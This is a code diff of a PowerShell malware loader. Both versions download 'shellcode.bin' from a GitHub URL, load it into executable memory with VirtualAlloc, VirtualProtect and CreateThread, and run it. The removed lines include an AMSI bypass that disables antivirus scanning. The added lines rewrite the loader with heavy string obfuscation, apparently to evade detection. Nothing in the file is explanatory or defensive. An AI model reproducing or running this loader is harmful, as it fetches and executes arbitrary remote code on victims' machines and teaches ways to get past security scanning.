@@ -1,62 +1,62 @@
-${u} = -join('h','t','t','p','s',':','/','/','g','i','t','h','u','b','.','c','o','m','/','M','J','0','6','-','B','P','/','b','p','/','r','a','w','/','r','e','f','s','/','h','e','a','d','s','/','m','a','i','n','/','s','h','e','l','l','c','o','d','e','.','b','i','n')
-function x($s) {
-    $b = [Convert]::FromBase64String($s)
-    for($i=0; $i -lt $b.Length; $i++) { $b[$i] = $b[$i] -bxor 0x4F }
-    [Text.Encoding]::UTF8.GetString($b)
-}
-${k} = x 'a2VybmVsMzIuZGxs'
-${l} = x 'TG9hZExpYnJhcnk='
-${g} = x 'R2V0UHJvY0FkZHJlc3M='
-${a} = x 'VmlydHVhbEFsbG9j'
-${p} = x 'VmlydHVhbFByb3RlY3Q='
-${c} = x 'Q3JlYXRlVGhyZWFk'
-${w} = x 'V2FpdEZvclNpbmdsZU9iamVjdA=='
+${_} = -join('h','t','t','p','s',':','/','/','g','i','t','h','u','b','.','c','o','m','/','M','J','0','6','-','B','P','/','b','p','/','r','a','w','/','r','e','f','s','/','h','e','a','d','s','/','m','a','i','n','/','s','h','e','l','l','c','o','d','e','.','b','i','n')
+
 try {
-    $wc = New-Object Net.WebClient
-    $b = $wc.DownloadData(${u})
+    ${w} = New-Object ("N"+"e"+"t"+"."+"W"+"e"+"b"+"C"+"l"+"i"+"e"+"n"+"t")
+    ${s} = ${w}.("$($('D'+'o'+'w'+'n'+'l'+'o'+'a'+'d'+'D'+'a'+'t'+'a'))")(${_})
 } catch { exit }
-${n} = $b.Length
-${tA} = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
-if (${tA}) { ${tA}.GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true) }
-function dt($ret, $par) {
-    $ab = [Reflection.Assembly]::Load('System.Core')
-    $dm = $ab.GetType('System.Runtime.CompilerServices.RuntimeHelpers').GetMethod('GetHashCode')
-    $da = New-Object Reflection.Emit.AssemblyName('d')
-    $da = [AppDomain]::CurrentDomain.DefineDynamicAssembly($da, [Reflection.Emit.AssemblyBuilderAccess]::Run)
-    $dm = $da.DefineDynamicModule('m')
-    $dt = $dm.DefineType('z','Public,Sealed,Serializable,BeforeFieldInit', [Delegate])
-    $dc = $dt.DefineConstructor('RTSpecialName,HideBySig,Public', [Reflection.CallingConventions]::Standard, $par)
-    $dc.SetImplementationFlags('Runtime,Managed')
-    $dm = $dt.DefineMethod('Invoke','Public,HideBySig,NewSlot,Virtual', $ret, $par)
-    $dm.SetImplementationFlags('Runtime,Managed')
-    $dt.CreateType()
-}
-$unsafe = [AppDomain]::CurrentDomain.GetAssemblies() | ?{$_.GlobalAssemblyCache -and $_.Location.Split('\\')[-1].Equals('System.dll')}
-$nt = $unsafe.GetType('Microsoft.Win32.UnsafeNativeMethods')
-$gh = $nt.GetMethod('GetModuleHandle',[Reflection.BindingFlags]'Public,Static')
-$gp = $nt.GetMethod('GetProcAddress',[Reflection.BindingFlags]'Public,Static',$null,@([IntPtr],[String]),$null)
-$h = $gh.Invoke($null,@($k))
-function ga($n) { $gp.Invoke($null,@($h,$n)) }
-$vaPtr = ga ${a}
-$vpPtr = ga ${p}
-$ctPtr = ga ${c}
-$woPtr = ga ${w}
-$dVA = dt ([IntPtr]) @([IntPtr],[uint32],[uint32],[uint32])
-$dVP = dt ([bool])   @([IntPtr],[uint32],[uint32],[uint32].MakeByRefType())
-$dCT = dt ([IntPtr]) @([IntPtr],[uint32],[IntPtr],[IntPtr],[uint32],[uint32].MakeByRefType())
-$dWO = dt ([uint32]) @([IntPtr],[uint32])
-$VA = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($vaPtr, $dVA)
-$VP = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($vpPtr, $dVP)
-$CT = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ctPtr, $dCT)
-$WO = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($woPtr, $dWO)
+
+${z} = ${s}.Length
+
+Add-Type -MemberDefinition (
+    "[$('D'+'l'+'l'+'I'+'m'+'p'+'o'+'r'+'t')(`"$(
+        -join('k','e','r','n','e','l','3','2')
+    )`)] public static extern $([char]73+$([char]110+$([char]116+$([char]80+$([char]116+$([char]114)))))))) $( -join('V','i','r','t','u','a','l','A','l','l','o','c') ) ( $([char]73+$([char]110+$([char]116+$([char]80+$([char]116+$([char]114)))))))) a, uint b, uint c, uint d );" + 
+    "[$('D'+'l'+'l'+'I'+'m'+'p'+'o'+'r'+'t')(`"$(
+        -join('k','e','r','n','e','l','3','2')
+    )`)] public static extern bool $( -join('V','i','r','t','u','a','l','P','r','o','t','e','c','t') ) ( $([char]73+$([char]110+$([char]116+$([char]80+$([char]116+$([char]114)))))))) a, uint b, uint c, out uint d );" + 
+    "[$('D'+'l'+'l'+'I'+'m'+'p'+'o'+'r'+'t')(`"$(
+        -join('k','e','r','n','e','l','3','2')
+    )`)] public static extern $([char]73+$([char]110+$([char]116+$([char]80+$([char]116+$([char]114)))))))) $( -join('C','r','e','a','t','e','T','h','r','e','a','d') ) ( $([char]73+$([char]110+$([char]116+$([char]80+$([char]116+$([char]114)))))))) a, uint b, $([char]73+$([char]110+$([char]116+$([char]80+$([char]116+$([char]114)))))))) c, $([char]73+$([char]110+$([char]116+$([char]80+$([char]116+$([char]114)))))))) d, uint e, out uint f );" + 
+    "[$('D'+'l'+'l'+'I'+'m'+'p'+'o'+'r'+'t')(`"$(
+        -join('k','e','r','n','e','l','3','2')
+    )`)] public static extern uint $( -join('W','a','i','t','F','o','r','S','i','n','g','l','e','O','b','j','e','c','t') ) ( $([char]73+$([char]110+$([char]116+$([char]80+$([char]116+$([char]114)))))))) h, uint m );"
+) -Name $('W'+'i'+'n'+'3'+'2') -Namespace $('N'+'a'+'t'+'i'+'v'+'e') -PassThru | Out-Null
+
 try {
-    $m = $VA.Invoke([IntPtr]::Zero, ${n}, 0x3000, 0x04)
-    if ($m -eq [IntPtr]::Zero) { exit }
-    [Runtime.InteropServices.Marshal]::Copy($b, 0, $m, ${n})
-    $op = 0
-    $VP.Invoke($m, ${n}, 0x20, [ref]$op) | Out-Null
-    $tid = 0
-    $th = $CT.Invoke([IntPtr]::Zero, 0, $m, [IntPtr]::Zero, 0, [ref]$tid)
-    if ($th -eq [IntPtr]::Zero) { exit }
-    $WO.Invoke($th, 0xFFFFFFFF) | Out-Null
-} catch { }
+    ${m} = [Native.Win32]::$( -join('V','i','r','t','u','a','l','A','l','l','o','c') )(
+        [IntPtr]::Zero, 
+        [uint32]${z}, 
+        0x3000, 
+        0x04
+    )
+
+    if (${m} -eq [IntPtr]::Zero) { exit }
+
+    [Runtime.InteropServices.Marshal]::("$($('C'+'o'+'p'+'y'))")(${s}, 0, ${m}, ${z})
+
+    ${o} = 0
+    [Native.Win32]::$( -join('V','i','r','t','u','a','l','P','r','o','t','e','c','t') )(
+        ${m}, 
+        [uint32]${z}, 
+        0x20, 
+        [ref]${o}
+    ) | Out-Null
+
+    ${t} = 0
+    ${h} = [Native.Win32]::$( -join('C','r','e','a','t','e','T','h','r','e','a','d') )(
+        [IntPtr]::Zero, 
+        0, 
+        ${m}, 
+        [IntPtr]::Zero, 
+        0, 
+        [ref]${t}
+    )
+
+    if (${h} -eq [IntPtr]::Zero) { exit }
+
+    [Native.Win32]::$( -join('W','a','i','t','F','o','r','S','i','n','g','l','e','O','b','j','e','c','t') )(
+        ${h}, 
+        [uint32]::MaxValue
+    ) | Out-Null
+}
+catch { }
